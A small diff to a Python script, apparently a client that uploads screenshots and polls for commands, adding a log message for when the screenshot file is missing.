@@ -152,6 +152,8 @@ def main():
                         files=files,
                         timeout=None)
                 # print("Screenshot upload complete")
+            else:
+                recentLogs("Screenshot file not found, not uploading")
 
             if status == "Do Nothing":
                 recentLogs("No command received")
